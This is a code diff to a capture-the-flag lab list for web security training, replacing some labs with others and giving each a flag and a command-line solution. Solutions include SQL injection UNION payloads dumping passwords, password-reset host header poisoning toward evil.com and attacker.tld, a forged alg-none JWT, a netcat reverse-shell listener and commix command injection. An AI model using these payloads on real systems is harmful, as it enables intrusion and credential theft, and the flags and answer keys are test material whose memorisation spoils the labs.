@@ -57,21 +57,6 @@ const LABS = [
     ],
   },
   {
-    id: 'web-waf-parsing-attacks', flag: 'nto{h0st_h34d3r_1nj3ct10n_c4ptur3s_th3_t0k3n}', hints: 4,
-    solution: [
-      `curl -s -d 'email=alice@shop.local' https://shop.local/password/reset`,
-      `curl -s -d 'email=alice@shop.local' https://shop.local/password/reset -H 'Host: evil.com'`,
-      `curl -s -d 'email=admin@shop.local' https://shop.local/password/reset -H 'Host: attacker.tld' > found.txt`,
-    ],
-  },
-  {
-    id: 'web-waf-evasion-basics', flag: 'nto{v3rb_t4mp3r1ng_byp4ss3s_th3_w4f}', hints: 4,
-    solution: [
-      `curl -s 'https://shop.local/api/products?id=1%20UNION%20SELECT%20pass%20FROM%20users'`,
-      `curl -s -X PATCH 'https://shop.local/api/products?id=1%20UNION%20SELECT%201,password,3%20FROM%20users' > found.txt`,
-    ],
-  },
-  {
     id: 'web-websocket', flag: 'nto{w3bs0ck3t_trusts_x_f0rw4rd3d_us3r}', hints: 4,
     solution: [
       `websocat ws://t/ws`,
@@ -102,35 +87,50 @@ const LABS = [
     ],
   },
   {
-    id: 'web-injection-advanced', flag: 'nto{s3c0nd_0rd3r_1nj3ct10n_st0r3d_p4yl04d}', hints: 4,
+    id: 'web-tool-jwt-tools', flag: 'nto{jwt_4lg_n0n3_f0rg3d_4dm1n}', hints: 4,
     solution: [
-      `curl -s 'https://shop.local/api/products?sort=price&order=asc'`,
-      `curl -s 'https://shop.local/api/products?sort=price,case%20when%201=1%20then%201%20else%201/0%20end&order=asc'`,
-      `curl -s -X POST https://shop.local/api/register -d @payload.txt`,
-      `curl -s https://shop.local/admin/report > found.txt`,
+      `cat token.txt`,
+      `python3 jwt_tool.py token.txt`,
+      `python3 jwt_tool.py token.txt -I -pc role -pv admin -S none`,
+      `curl -s https://shop.acme-lab.test/admin -H 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJhZG1pbiJ9.' > found.txt`,
     ],
   },
   {
-    id: 'web-http3-quic', flag: 'nto{h3_udp_byp4ss3s_th3_tcp_w4f}', hints: 4,
+    id: 'web-tool-netcat-socat', flag: 'nto{r3v3rs3_sh3ll_c4ught_th3_fl4g}', hints: 4,
     solution: [
-      `curl -sI https://shop.local/`,
-      `curl -sI --http3 https://shop.local/`,
-      `curl -sI https://shop.local/admin`,
-      `curl -sI --http3 https://shop.local/admin > found.txt`,
+      `cat shell.sh`,
+      `nc -lvnp 4444 > found.txt`,
     ],
   },
   {
-    id: 'web-waf-bypass-advanced', flag: 'nto{ch4rs3t_c0nfus10n_byp4ss3s_th3_w4f}', hints: 4,
+    id: 'web-tool-httpx-katana', flag: 'nto{httpx_k4t4n4_m4pp3d_th3_h1dd3n_3ndp01nt}', hints: 4,
     solution: [
-      `curl -s 'https://shop.local/search?q=test%27%20OR%201%3D1--'`,
-      `curl -s -X POST https://shop.local/search -H 'Content-Type: application/x-www-form-urlencoded; charset=ibm037' --data-binary @bypass.txt > found.txt`,
+      `httpx -l subs.txt -title -tech-detect -status-code -silent`,
+      `katana -u https://shop.example -jc`,
+      `curl -s https://shop.example/internal/flag > found.txt`,
     ],
   },
   {
-    id: 'web-websocket-smuggling', flag: 'nto{w3bs0ck3t_upgr4d3_d3sync_smuggl3s_th3_r3qu3st}', hints: 4,
+    id: 'web-tool-sqli-manual', flag: 'nto{m4nu4l_un10n_byp4ss3s_sqlm4p}', hints: 4,
     solution: [
-      `curl -s -i -H 'Upgrade: websocket' -H 'Connection: Upgrade' https://target.local/chat`,
-      `curl -s --data-binary @smuggle.txt https://target.local/chat -H 'Upgrade: websocket' -H 'Connection: Upgrade' > found.txt`,
+      `curl -s 'https://shop.example/api/item?id=1'`,
+      `curl -s 'https://shop.example/api/item?id=1%27'`,
+      `curl -s 'https://shop.example/api/item?id=1 ORDER BY 3'`,
+      `curl -s 'https://shop.example/api/item?id=-1 UNION SELECT 1,password,3 FROM users-- -' > found.txt`,
+    ],
+  },
+  {
+    id: 'web-tool-burp-zap', flag: 'nto{1d0r_f0und_v14_r3p34t3r}', hints: 4,
+    solution: [
+      `cat request.txt`,
+      `curl -s 'https://shop.acme-lab.test/api/users?id=1' -H 'Cookie: session=user'`,
+      `curl -s 'https://shop.acme-lab.test/api/users?id=2' -H 'Cookie: session=user' > found.txt`,
+    ],
+  },
+  {
+    id: 'web-tool-injection-tools', flag: 'nto{c0mm1x_4ut0m4t3s_th3_rc3}', hints: 4,
+    solution: [
+      `commix -u 'https://shop.acme-lab.test/ping?host=127.0.0.1' --batch --os-cmd='cat /flag' > found.txt`,
     ],
   },
 ]
